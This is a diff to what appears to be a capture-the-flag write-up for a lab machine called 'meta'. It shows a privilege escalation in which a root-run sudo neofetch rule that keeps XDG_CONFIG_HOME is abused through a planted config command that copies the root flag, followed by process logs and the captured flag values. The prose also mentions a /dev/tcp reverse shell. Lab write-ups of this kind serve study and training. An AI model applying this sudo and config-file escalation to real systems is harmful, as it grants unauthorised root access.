@@ -319,8 +319,40 @@ ed0090c7bc96ec6aec981f300e8bfb8e
 2022/01/29 18:08:01 CMD: UID=0    PID=23283  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf 
 ````
 
+````
+-bash-5.0$ sudo -l
+Matching Defaults entries for thomas on meta:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME
 
+User thomas may run the following commands on meta:
+    (root) NOPASSWD: /usr/bin/neofetch \"\"
+````
+
+Add to /home/thomas/.config/neofetch; you can also create an reverse shell with /dev/tcp
+````
+/bin/bash -c "cp /root/root.txt .; chown thomas:thomas root.txt" 
+````
+
+````
+$ export XDG_CONFIG_HOME="$HOME/.config"
+$ sudo -u root /usr/bin/neofetch \"\"
+````
+
+````
+2022/01/29 18:48:27 CMD: UID=0    PID=25194  | /bin/bash -c cp /root/root.txt .; chown thomas:thomas root.txt 
+````
+
+````
+-bash-5.0$ ls -lah
+total 28K
+drwxr-xr-x 2 thomas thomas 4.0K Jan 29 18:48 .
+drwxr-xr-x 3 thomas thomas 4.0K Aug 30 13:01 ..
+-rw-r--r-- 1 thomas thomas  15K Jan 29 18:48 config.conf
+-rwxr----- 1 thomas thomas   33 Jan 29 18:48 root.txt
+-bash-5.0$ cat root.txt 
+b2eec224df2c6535cb8784f433ca989d
+````
 
 # Secrets
 * FLAG_USER = ed0090c7bc96ec6aec981f300e8bfb8e
-* FLAG_ROOT = 
+* FLAG_ROOT = b2eec224df2c6535cb8784f433ca989d
